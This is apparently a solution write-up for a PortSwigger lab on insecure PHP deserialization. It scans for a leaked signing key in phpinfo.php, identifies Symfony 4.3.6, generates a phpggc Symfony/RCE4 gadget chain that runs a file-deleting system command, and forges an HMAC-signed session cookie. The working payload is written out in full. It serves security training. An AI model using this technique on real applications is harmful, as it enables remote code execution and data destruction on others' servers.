[Insecure deserialization](../Insecure%20deserialization.md)

# Description

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

# Solution

Scan directories
```sh
dirsearch -u "https://0a8200a704dcb0c68298d3c9001a0045.web-security-academy.net/" -w $seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```sh
[00:21:32] 200 -  410B  - /cgi-bin
```

in `cgi-bin` find `phpinfo.php`
Also you can find it in source code ://////
```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

## Found signing key

Inside phpinfo.php we can find PHP variables,

|                        |                                  |
| ---------------------- | -------------------------------- |
| $_SERVER['SECRET_KEY'] | tpzry0udixx6bdfptognv6t3gp64ctn1 |
This 'SECRET_KEY' is used to sign session serialized data.

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzZDVmeWhvb200ZXNuN3ZkajF4NG44eHhwZW9iZ2N6NyI7fQ==","sig_hmac_sha1":"b2c5015ee346fcb3f9e0ff6c29aec8408361ff3d"}
```

`sig_hmac_sha1` is our signature of `token`, 
Now we can generate valid signed session token.

## Reveal Framework and Version

try to corrupt session cookie, than error reveal 
```
Internal Server Error: Symfony Version: 4.3.6
```

## Generate gadget chain
https://github.com/ambionics/phpggc
Symfony/RCE4     3.4.0-34, 4.2.0-11, 4.3.0-7 
This gadget chain the most fits for our version
```sh
./phpggc Symfony/RCE4 system "rm /home/carlos/morale.txt" -b
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0=
```
## Sign and construct valid session

We can use https://www.freeformatter.com/hmac-generator.html#before-output to sign payload using [Found signing key](#Found%20signing%20key)

![](Attachments/Pasted%20image%2020240528005224.png)

![](Attachments/Pasted%20image%2020240528005231.png)

## Final payload
```json
{"token":"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0=","sig_hmac_sha1":"af1d6aaa91a8060e5b5c3ca1a8ec2ca8965eac45"}
```

URL encode it, and make request with this cookie

